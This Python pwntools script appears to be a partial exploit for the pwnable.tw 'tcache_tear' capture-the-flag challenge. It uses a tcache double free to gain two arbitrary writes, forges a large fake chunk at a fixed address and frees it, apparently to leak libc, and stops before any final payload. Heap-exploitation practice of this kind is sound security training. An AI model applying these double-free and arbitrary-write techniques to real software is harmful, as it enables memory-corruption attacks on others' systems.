#!/usr/bin/env python3

from pwn import *

exe = ELF("tcache_tear_patched")
libc = ELF("libc.so.6")
ld = ELF("./ld-2.27.so")

# main:     0x400bc7
# allocate: 0x400b14

p = gdb.debug('./tcache_tear_patched', gdbscript='''
	b * 0x400bc7
	b * 0x400b14
	b * 0x400b99
  continue
''')
#p = process('./tcache_tear_patched')
#p = remote('chall.pwnable.tw', 10207)

def Malloc(size, data):
	p.sendlineafter(b'Your choice :', b'1')
	p.sendlineafter(b'Size:', size)
	p.sendafter(b'Data:', data)

def Free():
	p.sendlineafter(b'Your choice :', b'2')

def Info():
	p.sendlineafter(b'Your choice :', b'3')
	

# Setup - Name input
p.sendlineafter(b'Name:', b'AAAA')

# 1st Arbitrary write
Malloc(b'80', b'AAAA')
Free()
Free()
target_addr1 = p64(0x00602050)
Malloc(b'80', target_addr1)
Malloc(b'80', b'AAAA')
payload1 = p64(0x0) + p64(0x421) + b'A' * 40 + p64(0x0602060)
Malloc(b'80', payload1)
print("[*] 1st arbitrary write complete")

# 2nd Arbitrary write
Malloc(b'64', b'AAAA')
Free()
Free()
target_addr2 = p64(0x00602470)
Malloc(b'64', target_addr2)
Malloc(b'64', b'AAAA')
payload2 = p64(0x0) + p64(0x21) + b'A' * 16 + p64(0x0) + p64(0x21)
Malloc(b'64', payload2)
print("[*] 2nd arbitrary write complete")

Info()
Free()
print("[*] Free forged chunk")

Info()

p.interactive()
